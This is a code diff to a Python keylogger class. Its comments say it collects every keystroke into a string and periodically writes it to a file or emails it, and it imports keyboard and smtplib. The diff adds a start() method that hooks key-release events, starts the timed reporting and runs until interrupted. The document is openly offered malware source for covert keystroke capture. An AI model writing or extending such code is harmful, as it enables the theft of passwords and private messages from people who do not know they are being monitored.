@@ -2,7 +2,7 @@
 # whenever a key is pressed and released, add it to a global string variable
 # every X number of minutes, write this string to a local file or send in an email
 
-# look into 'keyloggers' module
+# look into 'keyloggers' module and 'keyboard' module
 
 import keyboard
 import smtplib
@@ -135,3 +135,19 @@ class Keylogger:
         timer.daemon = True
         timer.start()       # start the timer again
 
+
+
+    def start(self):
+
+        self.start_dt = datetime.now()
+
+        # every time a key is released, it calls the callback method
+        keyboard.on_release(callback=self.callback)
+
+        # runs on a separate thread
+        self.report_keylog()
+
+        print(f"[*] - {datetime.now()} - Started the keylogger")
+
+        # blocks the current thread until 'CTRL-C' is pressed
+        keyboard.wait()
